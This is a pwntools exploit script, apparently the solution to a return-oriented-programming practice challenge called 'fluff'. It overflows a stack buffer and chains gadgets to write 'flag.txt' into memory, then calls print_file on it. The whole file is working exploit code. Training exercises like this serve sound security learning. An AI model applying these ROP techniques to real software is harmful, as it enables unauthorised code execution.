#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./fluff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./fluff')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x0000000000400606
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'
bssminus=0x0000000000601038-0x48
rop=ROP(exe)
pad=b"A"*cyclic_find(0x6161616b)
rop.raw(0x000000000040062a) #  pop rdx; pop rcx; add rcx,     0x3ef2; bextr rbx, rcx, rdx; ret; 
rop.raw('flagflag') # rdx
rop.raw('EEEEEEEE') #rcx junk
rop.raw(0x0000000000400588) # pop rbp; ret;
rop.raw(bssminus) # bssaddress-0x48
rop.raw(0x0000000000400606) # mov dword ptr [rbp + 0x48],     edx; mov ebp, esp; call 0x500; mov eax, 0; pop     rbp; ret;
rop1=ROP(exe)
rop1.raw(0x000000000040062a) #  pop rdx; pop rcx; add rcx,     0x3ef2; bextr rbx, rcx, rdx; ret; 
rop1.raw('.txt.txt') # rdx
rop1.raw('EEEEEEEE') #rcx junk
rop1.raw(0x0000000000400588) # pop rbp; ret;
rop1.raw(bssminus+4) # bssaddress-0x48
rop1.raw(0x0000000000400606) # mov dword ptr [rbp + 0x48],     edx; mov ebp, esp; call 0x500; mov eax, 0; pop     rbp; ret;
rop2=ROP(exe)
rop2.print_file(0x0000000000601038)
payload=(
    pad+rop.chain()
)
io = start()
log.info("First Chain: \n"+rop.dump())
io.sendline(payload)
payload=(
    pad+rop1.chain()
)
io.recv(1028)
log.info("Second Chain:\n"+rop1.dump())
io.sendline(payload)
payload=(
    pad+rop2.chain()
)
io.recv(1028)
log.info("Third Chain:\n"+rop2.dump())
io.sendline(payload)



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

